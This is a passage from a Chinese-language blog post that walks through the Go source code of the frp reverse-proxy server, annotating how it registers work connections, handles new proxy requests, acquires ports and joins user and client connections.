class="hljs-comment">// Check auth.</span><br><span class="hljs-comment">// 检测客户端的认证</span><br>err = ctl.authVerifier.VerifyNewWorkConn(newMsg)<br>&#125;<br><span class="hljs-comment">// 有错误则返回开启代理失败</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;invalid NewWorkConn with run id [%s]&quot;</span>, newMsg.RunID)<br>_ = msg.WriteMsg(workConn, &amp;msg.StartWorkConn&#123;<br>Error: util.GenerateResponseErrorString(<span class="hljs-string">&quot;invalid NewWorkConn&quot;</span>, err, lo.FromPtr(svr.cfg.DetailedErrorsToClient)),<br>&#125;)<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid NewWorkConn with run id [%s]&quot;</span>, newMsg.RunID)<br>&#125;<br><span class="hljs-comment">// 注册工作连接</span><br><span class="hljs-keyword">return</span> ctl.RegisterWorkConn(workConn)<br>&#125;<br><br><br><br><span class="hljs-comment">// RegisterWorkConn</span><br><span class="hljs-comment">// 这里主要是把客户端的这个工作连接放到控制器的 ctl.workConnCh</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> RegisterWorkConn(conn net.Conn) <span class="hljs-type">error</span> &#123;<br>xl := ctl.xl<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err := <span class="hljs-built_in">recover</span>(); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;panic error: %v&quot;</span>, err)<br>xl.Errorf(<span class="hljs-type">string</span>(debug.Stack()))<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> ctl.workConnCh &lt;- conn:<br>xl.Debugf(<span class="hljs-string">&quot;new work connection registered&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">default</span>:<br>xl.Debugf(<span class="hljs-string">&quot;work connection pool is full, discarding&quot;</span>)<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;work connection pool is full, discarding&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="消息调度器-msg-NewProx"><a href="#消息调度器-msg-NewProx" class="headerlink" title="消息调度器 msg.NewProx"></a>消息调度器 msg.NewProx</h4><p>返回来看一下上面注册的消息调度器，主要看一下 msg.NewProxy ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> registerMsgHandlers() &#123;<br>ctl.msgDispatcher.RegisterHandler(&amp;msg.NewProxy&#123;&#125;, ctl.handleNewProxy)<br><span class="hljs-comment">// ... </span><br>&#125;<br></code></pre></td></tr></table></figure><p>客户端在登录成功后，启动代理就是去发送一个新建代理的请求，现在看下服务端是如何处理的：</p><ol><li>控制器根据 msg.NewProxy 注册代理 <code>ctl.RegisterProxy(inMsg)</code>​ &#x3D;&gt; 主要逻辑</li><li>响应给客户端 msg.NewProxyResp</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> handleNewProxy(m msg.Message) &#123;<br>xl := ctl.xl<br>inMsg := m.(*msg.NewProxy)<br><br>content := &amp;plugin.NewProxyContent&#123;<br>User: plugin.UserInfo&#123;<br>User:  ctl.loginMsg.User,<br>Metas: ctl.loginMsg.Metas,<br>RunID: ctl.loginMsg.RunID,<br>&#125;,<br>NewProxy: *inMsg,<br>&#125;<br><span class="hljs-keyword">var</span> remoteAddr <span class="hljs-type">string</span><br><span class="hljs-comment">// 主要是插件对代理的处理</span><br>retContent, err := ctl.pluginManager.NewProxy(content)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>inMsg = &amp;retContent.NewProxy<br><span class="hljs-comment">// 注册这个代理 主要逻辑</span><br>remoteAddr, err = ctl.RegisterProxy(inMsg)<br>&#125;<br><br><span class="hljs-comment">// register proxy in this control</span><br><span class="hljs-comment">// 新建代理响应</span><br>resp := &amp;msg.NewProxyResp&#123;<br>ProxyName: inMsg.ProxyName,<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;new proxy [%s] type [%s] error: %v&quot;</span>, inMsg.ProxyName, inMsg.ProxyType, err)<br>resp.Error = util.GenerateResponseErrorString(fmt.Sprintf(<span class="hljs-string">&quot;new proxy [%s] error&quot;</span>, inMsg.ProxyName),<br>err, lo.FromPtr(ctl.serverCfg.DetailedErrorsToClient))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>resp.RemoteAddr = remoteAddr<br>xl.Infof(<span class="hljs-string">&quot;new proxy [%s] type [%s] success&quot;</span>, inMsg.ProxyName, inMsg.ProxyType)<br>metrics.Server.NewProxy(inMsg.ProxyName, inMsg.ProxyType)<br>&#125;<br><span class="hljs-comment">// 响应给客户端</span><br>_ = ctl.msgDispatcher.Send(resp)<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctl.RegisterProxy(inMsg)</code>​</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> RegisterProxy(pxyMsg *msg.NewProxy) (remoteAddr <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> pxyConf v1.ProxyConfigurer<br><span class="hljs-comment">// Load configures from NewProxy message and validate.</span><br>pxyConf, err = config.NewProxyConfigurerFromMsg(pxyMsg, ctl.serverCfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// User info</span><br>userInfo := plugin.UserInfo&#123;<br>User:  ctl.loginMsg.User,<br>Metas: ctl.loginMsg.Metas,<br>RunID: ctl.runID,<br>&#125;<br><br><span class="hljs-comment">// NewProxy will return an interface Proxy.</span><br><span class="hljs-comment">// In fact, it creates different proxies based on the proxy type. We just call run() here.</span><br>pxy, err := proxy.NewProxy(ctl.ctx, &amp;proxy.Options&#123;<br>UserInfo:           userInfo,<br>LoginMsg:           ctl.loginMsg,<br>PoolCount:          ctl.poolCount,<br>ResourceController: ctl.rc,<br>GetWorkConnFn:      ctl.GetWorkConn,<br>Configurer:         pxyConf,<br>ServerCfg:          ctl.serverCfg,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> remoteAddr, err<br>&#125;<br><br><span class="hljs-comment">// Check ports used number in each client</span><br><span class="hljs-keyword">if</span> ctl.serverCfg.MaxPortsPerClient &gt; <span class="hljs-number">0</span> &#123;<br>ctl.mu.Lock()<br><span class="hljs-keyword">if</span> ctl.portsUsedNum+pxy.GetUsedPortsNum() &gt; <span class="hljs-type">int</span>(ctl.serverCfg.MaxPortsPerClient) &#123;<br>ctl.mu.Unlock()<br>err = fmt.Errorf(<span class="hljs-string">&quot;exceed the max_ports_per_client&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>ctl.portsUsedNum += pxy.GetUsedPortsNum()<br>ctl.mu.Unlock()<br><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctl.mu.Lock()<br>ctl.portsUsedNum -= pxy.GetUsedPortsNum()<br>ctl.mu.Unlock()<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// 是否重复</span><br><span class="hljs-keyword">if</span> ctl.pxyManager.Exist(pxyMsg.ProxyName) &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;proxy [%s] already exists&quot;</span>, pxyMsg.ProxyName)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 代理运行</span><br>remoteAddr, err = pxy.Run()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>pxy.Close()<br>&#125;<br>&#125;()<br><span class="hljs-comment">// 注册</span><br>err = ctl.pxyManager.Add(pxyMsg.ProxyName, pxy)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>ctl.mu.Lock()<br>ctl.proxies[pxy.GetName()] = pxy<br>ctl.mu.Unlock()<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>pxy.Run()</code>​ 启动代理：</p><ol><li>监听代理的转发端口</li><li>处理监听 用户连接 &lt;&#x3D;&gt; 客户端连接</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *TCPProxy)</span></span> Run() (remoteAddr <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;<br>xl := pxy.xl<br><span class="hljs-keyword">if</span> pxy.cfg.LoadBalancer.Group != <span class="hljs-string">&quot;&quot;</span> &#123;<br>l, realBindPort, errRet := pxy.rc.TCPGroupCtl.Listen(pxy.name, pxy.cfg.LoadBalancer.Group, pxy.cfg.LoadBalancer.GroupKey,<br>pxy.serverCfg.ProxyBindAddr, pxy.cfg.RemotePort)<br><span class="hljs-keyword">if</span> errRet != <span class="hljs-literal">nil</span> &#123;<br>err = errRet<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>l.Close()<br>&#125;<br>&#125;()<br>pxy.realBindPort = realBindPort<br>pxy.listeners = <span class="hljs-built_in">append</span>(pxy.listeners, l)<br>xl.Infof(<span class="hljs-string">&quot;tcp proxy listen port [%d] in group [%s]&quot;</span>, pxy.cfg.RemotePort, pxy.cfg.LoadBalancer.Group)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 获取端口</span><br>pxy.realBindPort, err = pxy.rc.TCPPortManager.Acquire(pxy.name, pxy.cfg.RemotePort)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>pxy.rc.TCPPortManager.Release(pxy.realBindPort)<br>&#125;<br>&#125;()<br><span class="hljs-comment">// 监听</span><br>listener, errRet := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, net.JoinHostPort(pxy.serverCfg.ProxyBindAddr, strconv.Itoa(pxy.realBindPort)))<br><span class="hljs-keyword">if</span> errRet != <span class="hljs-literal">nil</span> &#123;<br>err = errRet<br><span class="hljs-keyword">return</span><br>&#125;<br>pxy.listeners = <span class="hljs-built_in">append</span>(pxy.listeners, listener)<br>xl.Infof(<span class="hljs-string">&quot;tcp proxy listen port [%d]&quot;</span>, pxy.cfg.RemotePort)<br>&#125;<br><br>pxy.cfg.RemotePort = pxy.realBindPort<br>remoteAddr = fmt.Sprintf(<span class="hljs-string">&quot;:%d&quot;</span>, pxy.realBindPort)<br><span class="hljs-comment">// 处理监听</span><br>pxy.startCommonTCPListenersHandler()<br><span class="hljs-keyword">return</span><br>&#125;<br><br><br><span class="hljs-comment">// 看一下这个端口的获取</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *Manager)</span></span> Acquire(name <span class="hljs-type">string</span>, port <span class="hljs-type">int</span>) (realPort <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>) &#123;<br>portCtx := &amp;PortCtx&#123;<br>ProxyName:  name,<br>Closed:     <span class="hljs-literal">false</span>,<br>UpdateTime: time.Now(),<br>&#125;<br><br><span class="hljs-keyword">var</span> ok <span class="hljs-type">bool</span><br><br>pm.mu.Lock()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>portCtx.Port = realPort<br>&#125;<br>pm.mu.Unlock()<br>&#125;()<br><br><span class="hljs-comment">// check reserved ports first</span><br><span class="hljs-comment">// 如果是 0 就看一下是不是预留了 0 这个端口, 如果能使用的话就是使用</span><br><span class="hljs-keyword">if</span> port == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">if</span> ctx, ok := pm.reservedPorts[name]; ok &#123;<br><span class="hljs-comment">// isPortAvailable 检测端口是否可用</span><br><span class="hljs-keyword">if</span> pm.isPortAvailable(ctx.Port) &#123;<br>realPort = ctx.Port<br>pm.usedPorts[realPort] = portCtx<br>pm.reservedPorts[name] = portCtx<br><span class="hljs-built_in">delete</span>(pm.freePorts, realPort)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 如果 0 不能使用就从空闲端口中获取一个随机的可用的端口 </span><br><span class="hljs-keyword">if</span> port == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// get random port</span><br>count := <span class="hljs-number">0</span><br>maxTryTimes := <span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> pm.freePorts &#123;<br>count++<br><span class="hljs-keyword">if</span> count &gt; maxTryTimes &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> pm.isPortAvailable(k) &#123;<br>realPort = k<br>pm.usedPorts[realPort] = portCtx<br>pm.reservedPorts[name] = portCtx<br><span class="hljs-built_in">delete</span>(pm.freePorts, realPort)<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> realPort == <span class="hljs-number">0</span> &#123;<br>err = ErrNoAvailablePort<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// specified port</span><br><span class="hljs-comment">// 其他自定义的端口</span><br><span class="hljs-keyword">if</span> _, ok = pm.freePorts[port]; ok &#123;<br><span class="hljs-keyword">if</span> pm.isPortAvailable(port) &#123;<br>realPort = port<br>pm.usedPorts[realPort] = portCtx<br>pm.reservedPorts[name] = portCtx<br><span class="hljs-built_in">delete</span>(pm.freePorts, realPort)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = ErrPortUnAvailable<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 已经使用过了</span><br><span class="hljs-keyword">if</span> _, ok = pm.usedPorts[port]; ok &#123;<br>err = ErrPortAlreadyUsed<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = ErrPortNotAllowed<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// startCommonTCPListenersHandler start a goroutine handler for each listener.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> startCommonTCPListenersHandler() &#123;<br>xl := xlog.FromContextSafe(pxy.ctx)<br><span class="hljs-keyword">for</span> _, listener := <span class="hljs-keyword">range</span> pxy.listeners &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(l net.Listener)</span></span> &#123;<br><span class="hljs-keyword">var</span> tempDelay time.Duration <span class="hljs-comment">// how long to sleep on accept failure</span><br><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">// block</span><br><span class="hljs-comment">// if listener is closed, err returned</span><br>c, err := l.Accept()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err, ok := err.(<span class="hljs-keyword">interface</span>&#123; Temporary() <span class="hljs-type">bool</span> &#125;); ok &amp;&amp; err.Temporary() &#123;<br><span class="hljs-keyword">if</span> tempDelay == <span class="hljs-number">0</span> &#123;<br>tempDelay = <span class="hljs-number">5</span> * time.Millisecond<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>tempDelay *= <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-keyword">if</span> maxTime := <span class="hljs-number">1</span> * time.Second; tempDelay &gt; maxTime &#123;<br>tempDelay = maxTime<br>&#125;<br>xl.Infof(<span class="hljs-string">&quot;met temporary error: %s, sleep for %s ...&quot;</span>, err, tempDelay)<br>time.Sleep(tempDelay)<br><span class="hljs-keyword">continue</span><br>&#125;<br><br>xl.Warnf(<span class="hljs-string">&quot;listener is closed: %s&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>xl.Infof(<span class="hljs-string">&quot;get a user connection [%s]&quot;</span>, c.RemoteAddr().String())<br><span class="hljs-comment">// 处理用户的 TCP 连接</span><br><span class="hljs-keyword">go</span> pxy.handleUserTCPConnection(c)<br>&#125;<br>&#125;(listener)<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">// HandleUserTCPConnection is used for incoming user TCP connections.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> handleUserTCPConnection(userConn net.Conn) &#123;<br>xl := xlog.FromContextSafe(pxy.Context())<br><span class="hljs-keyword">defer</span> userConn.Close()<br><br>serverCfg := pxy.serverCfg<br>cfg := pxy.configurer.GetBaseConfig()<br><span class="hljs-comment">// server plugin hook</span><br>rc := pxy.GetResourceController()<br>content := &amp;plugin.NewUserConnContent&#123;<br>User:       pxy.GetUserInfo(),<br>ProxyName:  pxy.GetName(),<br>ProxyType:  cfg.Type,<br>RemoteAddr: userConn.RemoteAddr().String(),<br>&#125;<br>_, err := rc.PluginManager.NewUserConn(content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;the user conn [%s] was rejected, err:%v&quot;</span>, content.RemoteAddr, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// try all connections from the pool</span><br><span class="hljs-comment">// 获取一个工作连接（ 从 ctl.workConnCh 工作连接池中获取一个工作连接）</span><br>workConn, err := pxy.GetWorkConnFromPool(userConn.RemoteAddr(), userConn.LocalAddr())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> workConn.Close()<br><span class="hljs-comment">// frps 和 frpc 的连接</span><br><span class="hljs-keyword">var</span> local io.ReadWriteCloser = workConn<br><span class="hljs-comment">// 加密、压缩、速率限制</span><br>xl.Tracef(<span class="hljs-string">&quot;handler user tcp connection, use_encryption: %t, use_compression: %t&quot;</span>,<br>cfg.Transport.UseEncryption, cfg.Transport.UseCompression)<br><span class="hljs-keyword">if</span> cfg.Transport.UseEncryption &#123;<br>local, err = libio.WithEncryption(local, []<span class="hljs-type">byte</span>(serverCfg.Auth.Token))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;create encryption stream error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Transport.UseCompression &#123;<br><span class="hljs-keyword">var</span> recycleFn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>local, recycleFn = libio.WithCompressionFromPool(local)<br><span class="hljs-keyword">defer</span> recycleFn()<br>&#125;<br><br><span class="hljs-keyword">if</span> pxy.GetLimiter() != <span class="hljs-literal">nil</span> &#123;<br>local = libio.WrapReadWriteCloser(limit.NewReader(local, pxy.GetLimiter()), limit.NewWriter(local, pxy.GetLimiter()), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> local.Close()<br>&#125;)<br>&#125;<br><br>xl.Debugf(<span class="hljs-string">&quot;join connections, workConn(l[%s] r[%s]) userConn(l[%s] r[%s])&quot;</span>, workConn.LocalAddr().String(),<br>workConn.RemoteAddr().String(), userConn.LocalAddr().String(), userConn.RemoteAddr().String())<br><span class="hljs-comment">// 用户连接 &lt;=&gt; 客户端的连接</span><br>name := pxy.GetName()<br>proxyType := cfg.Type<br>metrics.Server.OpenConnection(name, proxyType)<br>inCount, outCount, _ := libio.Join(local, userConn)<br>metrics.Server.CloseConnection(name, proxyType)<br>metrics.Server.AddTrafficIn(name, proxyType, inCount)<br>metrics.Server.AddTrafficOut(name, proxyType, outCount)<br>xl.Debugf(<span class="hljs-string">&quot;join connections closed&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端接收到客户端的新建代理请求后，本地监听对应的转发端口，当有用户连接的时候，服务端向客户端发送新建工作的消息去建立工作连接，然后用户连接和客户端工作连接相互交换实现代理。</p><p>再看一下这个工作连接的来源：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 